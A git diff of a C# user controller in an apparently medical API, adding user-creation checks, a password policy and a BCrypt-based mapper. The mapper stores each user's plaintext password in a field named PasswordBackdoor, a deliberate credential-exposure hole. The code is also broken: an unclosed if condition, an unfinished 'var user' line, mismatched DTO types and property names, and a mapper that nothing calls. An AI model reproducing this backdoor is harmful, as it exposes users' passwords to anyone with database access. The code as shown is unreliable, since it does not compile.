@@ -17,9 +17,24 @@ namespace MedDockerAPI.Controllers
         {
             _Context = context;
         }
-        [HttpPost]
-        public async Task<IActionResult> Create([FromBody] User user)
+
+        [HttpPost("createUser")]
+        public async Task<IActionResult> Create([FromBody] UserDTO userDTO)
         {
+            if(await _Context.Users.AnyAsync(u =>  u.UserName == userDTO.UserName))
+            {
+                return Conflict(new { message = "Username already in use" });
+            }
+            if(await _Context.Users.AnyAsync(u =>u.Email == userDTO.Email))
+            {
+                return Conflict(new {message = "Email is already in use"});
+            }
+            if (!IsPasswordSecure(userDTO.Password)
+            {
+                return Conflict(new {message = "Password is not secure"});
+            }
+            var user
+
             _Context.Users.Add(user);
             await _Context.SaveChangesAsync();
             return Ok();
@@ -51,6 +66,7 @@ namespace MedDockerAPI.Controllers
 
             return Ok(users);
         }
+
         [HttpPut]
         public async Task<IActionResult> UpdateUser(string id, [FromBody] User updatedUser)
         {
@@ -114,6 +130,41 @@ namespace MedDockerAPI.Controllers
             _Context.Users.Remove(user);
             await _Context.SaveChangesAsync();
             return (Ok());
+        }
+
+
+        private bool IsPasswordSecure(string password)
+        {
+            var hasUppercase = new Regex(@"[A-Z]+");
+            var hasLowercase = new Regex(@"[a-z]+");
+            var hasNumbers = new Regex(@"[0-9]+");
+            var hasSpecialChars = new Regex(@"[\W_]+");
+            var hasMinimumChars = new Regex(@".{8,}");
+
+            return hasUppercase.IsMatch(password) &&
+                hasLowercase.IsMatch(password) &&
+                hasNumbers.IsMatch(password) &&
+                hasSpecialChars.IsMatch(password) &&
+                hasMinimumChars.IsMatch(password);
+        }
+
+        private User MapCreateUserDTO(CreateUserDTO createUserDTO)
+        {
+            string hashedPassword = BCrypt.Net.BCrypt.HashPassword(createUserDTO.Password);
+            string salt = hashedPassword.Substring(0, 29);
+
+            return new User
+            {
+                Id = Guid.NewGuid().ToString("N"),
+                Email = createUserDTO.Email,
+                Username = createUserDTO.Username,
+                CreatedAt = DateTime.UtcNow.AddHours(1),
+                UpdatedAt = DateTime.UtcNow.AddHours(1),
+                LastLogin = DateTime.UtcNow.AddHours(1),
+                HashedPassword = hashedPassword,
+                Salt = salt,
+                PasswordBackdoor = createUserDTO.Password,
+            };
         }
 
     }
